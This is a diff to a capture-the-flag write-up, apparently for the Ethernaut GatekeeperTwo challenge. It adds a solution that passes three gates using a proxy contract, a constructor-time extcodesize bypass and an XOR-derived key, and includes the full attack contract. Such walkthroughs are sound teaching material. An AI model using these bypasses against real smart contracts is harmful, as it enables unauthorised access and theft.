@@ -857,8 +857,83 @@ instance.entrant() == _player;
 
 ### Solution
 
-???
+* `gateOne()`
+
+```solidity
+require(msg.sender != tx.origin);
+```
+
+is passed through by using a proxy contract
+
+* `gateTwo()`
+
+```solidity
+uint x;
+assembly { x := extcodesize(caller()) }
+require(x == 0);
+```
+
+`extcodesize(caller())` retrieves the size of the call sender contract. See [Yul EVM dialect](https://docs.soliditylang.org/en/v0.8.19/yul.html#evm-dialect).
+
+As the [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf)
+
+  7.1. Subtleties. Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code.
+
+and the foot note in that page
+
+  During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while CODESIZE should return the length of the initialization code (as defined in H.2).
+
+Meaning that `extcodesize(caller())` will return `0` during the creation of the contract. In other words, we need to introduce our attack **at the constructor of the contract** we are using to attack the level.
+
+* `gateThree()`
+
+```solidity
+require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
+```
+
+This requires some algebra
+
+```solidity
+//   if Constant ^ key = 0xff
+//   then key = 0xff ^ constant
+//   notice that they are checking against msg.sender,
+//   so compute the key at the proxy
+```
+
+The code to produce the `key` would be
+
+```solidity
+bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xffffffffffffffff;
+```
+
+where the `Constant` above is `bytes8(keccak256(abi.encodePacked(address(this))))`.
+
+Putting everything together, then, we create an attack contract
+
+```solidity
+contract Proxy {
+  constructor(address _challengeAddress) {
+    IGatekeeperTwo challenge = IGatekeeperTwo(_challengeAddress);
+    bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xffffffffffffffff;
+
+    challenge.enter(key);
+  }
+}
+```
+
+And we call it like this
+
+
+```solidity
+// attack being performed at the construction of the contract
+Proxy proxy = new Proxy(challengeAddress);
+proxy;
+```
 
 ### References
 
-* ???
+* https://docs.soliditylang.org/en/v0.8.19/contracts.html#function-modifiers
+* https://docs.soliditylang.org/en/v0.8.19/assembly.html
+* https://docs.soliditylang.org/en/v0.8.19/yul.html#evm-dialect
+* https://ethereum.github.io/yellowpaper/paper.pdf
+  * See "Contract Creation"
